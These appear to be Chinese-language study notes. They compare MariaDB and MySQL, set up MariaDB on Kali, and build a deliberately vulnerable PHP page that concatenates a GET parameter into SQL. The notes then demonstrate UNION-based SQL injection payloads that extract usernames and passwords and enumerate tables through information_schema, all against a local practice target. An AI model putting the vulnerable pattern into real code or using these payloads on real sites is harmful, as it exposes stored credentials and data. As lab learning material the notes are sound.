# mariaDB和mysql有什么区别

(kali镜像上默认的是mariaDB)

1. 起源和关系
    MySQL
    最早由瑞典公司 MySQL AB 开发，后来被 Sun Microsystems 收购，再被 Oracle 收购。
    MariaDB
    由 MySQL 的原始开发团队在 Oracle 收购后分支出来，作为 MySQL 的“开源替代品”。
2. ***兼容性***
    命令行、API、协议：MariaDB 和 MySQL 在大多数场景下都兼容，配置和 SQL 语法基本一致。
    数据文件格式：绝大多数情况下 MariaDB 可以无缝替换 MySQL（低版本），但高版本功能逐渐分化。
3. 开源与授权
    MySQL
    Oracle 主导，分为社区版和商业版，部分新功能限制在商业版。
    MariaDB
    完全开源，采用 GPL 授权，更加开放。
4. 发展方向
    MySQL
    由 Oracle 主导，开发进度和新特性发布更谨慎，部分新特性闭源。
    MariaDB
    社区驱动，更新较快，集成了更多存储引擎和新特性（如 Aria、ColumnStore、Spider 等）。
5. 性能与扩展
    MariaDB 针对某些查询和多线程有优化，部分场景下性能优于 MySQL。
    MariaDB 集成了更多存储引擎选择。
6. ***应用兼容***
    大多数使用 MySQL 的应用（如 WordPress、phpMyAdmin）也可以直接用 MariaDB，无需修改代码。
    但在高版本（特别是 10.x 以后），新特性可能出现不兼容。
7. 命令和使用习惯
    操作命令几乎一致：mysql、mysqldump、mysqladmin 等 MariaDB 也提供。
    配置文件、目录结构基本相同。
8. 默认情况
    许多 Linux 发行版（如 Debian、Kali、Ubuntu）默认源里已经用 MariaDB 替换了 MySQL。
简明总结
    MariaDB 是 MySQL 的一个分支，保持高度兼容，性能更优，开源更彻底。
    MySQL 由 Oracle 控制，部分功能闭源，适合需要官方支持的企业用户。

# 基础步骤

```bash 
sudo systemctl start mariadb //启动数据库服务
```

```bash
sudo systemctl enable mariadb //设置开机自启动（方便一点）
```

```bash
sudo mariadb //默认无密码，直接用sudo权限即可启动
```

```bash
mariadb -u root -p //账号名加密码登录
```

```sql
SET PASSWORD FOR 'root'@'localhost' = PASSWORD('kali'); //将密码设置为kali
```

# 简单的数据库创建

```sql
CREATE DATABASE test; //创建数据库
```

```sql
SHOW DATABASES; //查看数据库列表
```

```sql
USE test; //选择数据库进入
```

```sql
CREATE TABLE users ( //创建数据表
    id INT PRIMARY KEY AUTO_INCREMENT, //id是一个int类型量，PRIMARY KEY唯一标识，每一行不能重复不能为空，AUTO_INCREMENT自增，自动加一，无需赋值
    username VARCHAR(50), //VARCHAR(50)表示一个最多存50个字符的变长字符串
    password VARCHAR(50)
);
```

```sql
INSERT INTO users (username, password) VALUES //往表中插入数据
('bob', 'password1'), //位置对应
('charlie', 'mypwd2'),
('david', 'abc123');
```

```sql
SELECT * FROM users; //查看表中所有条目
```

```bash
sudo dpkg -i vscode.deb //（插播）使用dpkg安装.deb安装包
```

创建一个基础用于测试sql注入的.php
```php
<?php
	$conn = mysqli_connect("localhost","root","kali","test");
	$res = mysqli_query($conn, "SELECT title, content FROM wp_news WHERE id=".$_GET['id']);
	$row = mysqli_fetch_array($res);
	echo "<center>";
	
	echo "<h1>".$row['title']."</h1>";
	echo "<br>";
	
	echo "<h1>".$row['content']."</h1>";
	echo "</center>";
?>
```

```sql
SELECT title, content FROM wp_news WHERE id=1; //SELECT的筛选查找
```

通过url传入id=3-2与id=1等价，id=3-1与id=2等价，这意味着对于算术式子mysql会自动计算结果传入。

这样子也可以推理得知php代码中是使用字符串直接连接$id和sql语句，因此可以直接用union注入：

?id=1 union select user,pwd from wp_user limit 1,1

```sql
SELECT title, content FROM wp_news WHERE id=1 union select user,pwd from wp_user limit 1,1;
//union会将两个select结果合并，这要求两部分字段数量和类型一致，而limit 1,1代表跳过第一行只取第二行
//也可以令前面的id=-1这样也是只显示后面的结果
```

实际情况中可以用url编码来导入空格，空格是'%20'。

在完全未知的情况下进行sql注入：

```sql
select 1, group_concat(table_name)
from information_schema.tables  
where table_schema = database(); 
```


- information_schema.tables：这是 MySQL 数据库的元数据表，存放所有数据库的表信息。
- where table_schema=database()：限定只查询当前所用数据库（database() 返回当前数据库名）。
- group_concat(table_name)：将当前数据库下所有表名用逗号拼接成一个字符串。
- select 1, ...：第一个字段恒为 1，第二个字段为拼接后的表名列表。

之所以拼接到一起，是因为利用union进行注入时要对齐字段数量和类型

实际注入：

?id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema = database();

这种注入的基本思路：

1 通过传入代数算式判断php语句的input两边是否有引号
2 随后利用union来进行其他的信息操作

# 如何在浏览器中查看php文件输出

将php文件放到/var/www/html/目录下

```bash
sudo cp yourfile.php /var/www/html/
```

在本地启动apache服务：

```bash
sudo systemctl start apache2
```


在浏览器中访问http://localhost/yourfile.php即可（已有apache2服务的前提下）

（前者是localhost的默认地址，应该也可以修改或者指定）


